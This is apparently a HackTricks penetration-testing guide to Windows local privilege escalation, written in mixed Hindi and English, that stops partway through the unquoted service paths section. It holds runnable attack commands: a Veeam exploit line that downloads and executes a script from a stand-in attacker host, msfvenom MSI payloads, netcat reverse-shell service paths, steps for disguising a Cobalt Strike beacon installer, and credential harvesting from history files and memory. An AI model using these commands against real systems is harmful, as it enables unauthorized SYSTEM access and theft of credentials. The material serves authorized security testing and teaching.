# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors ढूंढने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**अगर आपको नहीं पता कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न page पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न page देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या हैं, तो आगे बढ़ने से पहले निम्न page पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में अलग-अलग चीज़ें होती हैं जो **आपको system enumerate करने से रोक सकती हैं**, executables चलाने से रोक सकती हैं, या यहाँ तक कि **आपकी गतिविधियों को detect** भी कर सकती हैं। privilege escalation enumeration शुरू करने से पहले आपको निम्न **page** **पढ़ना** चाहिए और इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के माध्यम से launch किए गए UIAccess processes का दुरुपयोग करके बिना prompt के High IL तक पहुँचा जा सकता है, जब AppInfo secure-path checks bypass किए जाते हैं। यहाँ dedicated UIAccess/Admin Protection bypass workflow देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

देखें कि Windows version में कोई known vulnerability है या नहीं (applied patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में detailed information खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो एक Windows environment द्वारा प्रस्तुत **massive attack surface** को दिखाता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप इसे कैसे चालू करें, यह [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में सीख सकते हैं
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन executions के details रिकॉर्ड किए जाते हैं, जिनमें executed commands, command invocations, और scripts के कुछ हिस्से शामिल हैं। हालांकि, complete execution details और output results capture नहीं भी हो सकते।

इसे enable करने के लिए, documentation के "Transcript files" section में दिए गए instructions follow करें, और **"Powershell Transcription"** की बजाय **"Module Logging"** चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आखिरी 15 events देखने के लिए आप execute कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के execution की complete activity और full content record captured की जाती है, जिससे यह सुनिश्चित होता है कि code के हर block को उसके run होने के साथ documented किया जाए। यह process प्रत्येक activity के लिए एक comprehensive audit trail preserve करती है, जो forensics और malicious behavior के analysis के लिए valuable है। execution के समय सभी activity को document करके, process में detailed insights प्रदान किए जाते हैं।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए logging events को Windows Event Viewer में इस path पर देखा जा सकता है: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
अंतिम 20 events देखने के लिए आप use कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि updates को http**S** के बजाय http का उपयोग करके request नहीं किया जाता है, तो आप system को compromise कर सकते हैं।

आप cmd में निम्नलिखित चलाकर शुरू करते हैं कि network non-SSL WSUS update का उपयोग करता है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` के बराबर है।

तो, **यह exploitable है।** यदि आख़िरी registry का मान 0 के बराबर है, तो WSUS entry ignore कर दी जाएगी।

इन vulnerabilities को exploit करने के लिए आप ऐसे tools उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS traffic में 'fake' updates inject करती हैं।

यह research यहाँ पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरा report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मूल रूप से, यह वही flaw है जिसे यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की power है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो इसलिए हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को locally चलाकर अपने ही traffic को intercept करने और अपने asset पर elevated user के रूप में code चलाने की power भी है।
>
> इसके अलावा, चूँकि WSUS service current user की settings उपयोग करती है, वह उसका certificate store भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate generate करें और इस certificate को current user के certificate store में add करें, तो हम HTTP और HTTPS दोनों WSUS traffic को intercept कर पाएँगे। WSUS certificate पर trust-on-first-use type validation लागू करने के लिए HSTS-like mechanisms का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और सही hostname रखता है, तो service उसे स्वीकार कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (एक बार यह liberated हो जाए)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर coerce किया जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता हो, तो local user एक malicious MSI दे सकता है जिसे SYSTEM service install कर देती है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के माध्यम से SYSTEM)

Veeam B&R < `11.0.1.1261` **TCP/9401** पर एक localhost service expose करता है जो attacker-controlled messages process करती है, जिससे **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाए जा सकते हैं।

- **Recon**: listener और version confirm करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` जैसा PoC, आवश्यक Veeam DLLs के साथ, उसी directory में रखें, फिर local socket के माध्यम से एक SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
सेवा कमांड को SYSTEM के रूप में execute करती है।
## KrbRelayUp

Windows **domain** environments में कुछ खास परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing is not enforced,** users के पास **self-rights** होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** configure करने की अनुमति देते हैं, और domain के भीतर computers create करने की capability होती है। यह ध्यान देना महत्वपूर्ण है कि ये **requirements** **default settings** के साथ पूरी हो जाती हैं।

Exploit in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) देखें

Attack के flow के बारे में अधिक जानकारी के लिए [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) देखें

## AlwaysInstallElevated

**यदि** ये 2 registers **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप इस तकनीक को module **`exploit/windows/local/always_install_elevated`** का उपयोग करके automate कर सकते हैं

### PowerUP

current directory के अंदर एक Windows MSI binary बनाने के लिए power-up से `Write-UserAddMSI` command का उपयोग करें ताकि privileges escalate किए जा सकें। यह script एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

इस टूल का उपयोग करके MSI wrapper कैसे बनाएं, यह सीखने के लिए इस tutorial को पढ़ें। ध्यान दें कि यदि आप केवल command lines execute करना चाहते हैं, तो आप "**.bat**" file को भी wrap कर सकते हैं

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** या **Metasploit** के साथ एक **new Windows EXE TCP payload** `C:\privesc\beacon.exe` में **Generate** करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को **AlwaysPrivesc** जैसा कोई नाम दें, location के लिए **`C:\privesc`** use करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) तक न पहुंच जाएं। **Add** पर क्लिक करें और अभी generate किया गया Beacon payload select करें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिख सकती है।
- project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file select करें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer run होते ही beacon payload execute हो जाए।
- **Custom Action Properties** के तहत, **Run64Bit** को **True** में बदलें।
- अंत में, इसे **build it** करें।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर set किया है।

### MSI Installation

malicious `.msi` file की **installation** को background में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability का exploit करने के लिए आप use कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ sent किए जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **local Administrator passwords** के management के लिए designed किया गया है, यह सुनिश्चित करते हुए कि हर password **unique, randomised, and regularly updated** हो domain से joined computers पर। ये passwords securely **Active Directory** के भीतर stored होते हैं और केवल वे users access कर सकते हैं जिन्हें ACLs के through sufficient permissions दी गई हों, जिससे वे authorized होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि active हो, तो **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में stored होते हैं।\
[**WDigest के बारे में अधिक जानकारी इस page पर**](../stealing-credentials/credentials-protections.md#wdigest)।
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से, Microsoft ने Local Security Authority (LSA) के लिए enhanced protection introduced की ताकि untrusted processes द्वारा इसकी memory **read** करने या code inject करने की attempts को **block** किया जा सके, जिससे system और अधिक secure हो गया।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य device पर stored credentials को pass-the-hash attacks जैसे threats से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### कैश्ड क्रेडेंशियल्स

**डोमेन क्रेडेंशियल्स** को **Local Security Authority** (LSA) द्वारा authenticated किया जाता है और operating system components द्वारा उपयोग किया जाता है। जब किसी user के logon data को एक registered security package द्वारा authenticated किया जाता है, तो user के लिए domain credentials आमतौर पर स्थापित हो जाती हैं।\
[**कैश्ड क्रेडेंशियल्स के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups की गणना करें

आपको जांचना चाहिए कि जिन groups में आप belong करते हैं, उनमें से किसी के पास interesting permissions हैं या नहीं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

अगर आप **किसी privileged group के member हैं, तो आप privileges escalate करने में सक्षम हो सकते हैं**। privileged groups के बारे में और उन्हें abuse करके privileges कैसे escalate करें, यह यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Token** क्या है, इसके बारे में **और जानें** इस page में: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**Interesting tokens** के बारे में जानने और उन्हें abuse करने के लिए निम्न page देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

सबसे पहले, processes की listing करते समय **process की command line के अंदर passwords check करें**।\
देखें कि क्या आप **चल रहे किसी binary को overwrite** कर सकते हैं या binary folder पर आपके पास write permissions हैं, ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploit किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, आप इसे privileges escalate करने के लिए abuse कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries की permissions की जाँच करना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**process binaries के फ़ोल्डरों की permissions चेक करना (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी Password mining

आप sysinternals के **procdump** का उपयोग करके चल रहे process का memory dump बना सकते हैं। FTP जैसी services में **credentials memory में clear text में** होते हैं, memory dump करने और credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM के रूप में चल रहे Applications किसी user को CMD spawn करने, या directories browse करने की अनुमति दे सकते हैं।**

Example: "Windows Help and Support" (Windows + F1), "command prompt" के लिए search करें, "Click to open Command Prompt" पर click करें

## Services

Service Triggers Windows को कुछ conditions होने पर service start करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START rights के बिना भी आप अक्सर उनके triggers fire करके privileged services start कर सकते हैं। यहां enumeration और activation techniques देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की list प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी पाने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए required privilege level check करने के लिए _Sysinternals_ से binary **accesschk** रखना recommended है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जांचें कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहां से XP के लिए accesschk.exe डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे इस प्रकार सक्षम कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि service upnphost को काम करने के लिए SSDPSRV पर निर्भर होना पड़ता है (XP SP1 के लिए)**

**इस समस्या का एक और workaround** यह चलाना है:
```
sc.exe config usosvc start= auto
```
### **सेवा बाइनरी पथ संशोधित करें**

उस परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** होता है, service के executable binary को modify करना संभव है। **sc** को modify और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### service को restart करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
निम्नलिखित permissions के माध्यम से privileges को escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration को सक्षम करता है, जिससे service configurations को बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership acquisition और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations को बदलने की क्षमता inherit करता है।
- **GENERIC_ALL**: service configurations को बदलने की क्षमता भी inherit करता है।

इस vulnerability की detection और exploitation के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**जांचें कि क्या आप उस binary को modify कर सकते हैं जो किसी service द्वारा execute की जाती है** या क्या आपके पास **उस folder पर write permissions हैं** जहाँ binary located है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप **wmic** का उपयोग करके हर उस binary को प्राप्त कर सकते हैं जो किसी service द्वारा execute की जाती है (system32 में नहीं) और **icacls** का उपयोग करके अपनी permissions जांच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

आपको जांचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप **check** कर सकते हैं अपनी **permissions** over a service **registry** इस तरह:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचा जाना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि हैं, तो service द्वारा execute किया जाने वाला binary बदला जा सकता है।

Executed binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features per-user **ATConfig** keys बनाते हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में कॉपी किया जाता है। एक registry **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे arbitrary HKLM **value write** primitive मिलता है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` installed accessibility features सूचीबद्ध करता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration store करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान create होता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** value को populate करें जिसे आप चाहते हैं कि SYSTEM द्वारा लिखा जाए।
2. secure-desktop copy trigger करें (e.g., **LockWorkstation**), जो AT broker flow शुरू करता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर एक **oplock** place करें; जब oplock fire हो, तो **HKLM Session ATConfig** key को एक **registry link** से protected HKLM target पर replace करें।
4. SYSTEM attacker-chosen value को redirected HKLM path पर write करता है।

एक बार arbitrary HKLM value write मिल जाने पर, service configuration values overwrite करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे normal user start कर सके (e.g., **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में **locks the workstation** करती है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, यह **arbitrary code execute करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows हर space से पहले वाले ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths की सूची बनाएं, built-in Windows services से संबंधित को छोड़कर:
